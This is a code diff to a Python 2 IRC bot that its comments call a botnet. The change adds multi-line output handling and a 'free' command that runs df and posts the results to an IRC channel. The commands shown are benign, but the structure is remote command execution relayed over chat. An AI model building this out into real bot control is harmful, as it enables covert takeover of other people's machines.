@@ -23,10 +23,28 @@ def genNick():
 	return str(flavor[:3] + rannum)
 
 def execute(cmd):
-	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
-	output, errors = p.communicate()
-	return output.strip('\n');
+        p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
+        output, errors = p.communicate()
 
+        #handling multi-line output
+        lines = []
+	temp = ""
+        for letter in output:
+                if (letter == '\n'):
+                        lines.append(temp)
+                        temp = ""
+                else:
+                        temp = temp + letter
+
+        #return one element if just a one-liner
+        if (len(lines) == 1):
+                return lines[0]
+
+        #return the whole list
+        else:
+                return lines
+
+#debugger
 DEBUG = 0
 if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 	DEBUG = 1
@@ -38,7 +56,7 @@ port = 6667
 channel = "#lobby"
 botnick = genNick()
 
-print botnick
+print "The botnick is:", botnick
 
 #All of the possible functions that the botnet is capable of
 def reply(): #send back to IRC server that you are here
@@ -58,13 +76,10 @@ def terminate(): #terminate program and send goodbye message
 	irc.send('PRIVMSG ' + channel + " :Oh no! We better find some cover." + '\r\n')
 	exit()
 
-#function that handles multiple-line output
-#def multipleLines():
-
-
-
-
-
+def freeSpace():
+	cmd = execute("df")
+	for line in cmd:
+		irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')
 
 #dictionary of functions
 commands = {
@@ -72,7 +87,8 @@ commands = {
 	"how are you" : iAmGood,
 	"who are you" : whoAmI,
 	"how old are you" : getAge,
-	"zombie apocalypse" : terminate
+	"zombie apocalypse" : terminate,
+	"free" : freeSpace
 }
 
 #function which parses the command and determine how to handle it
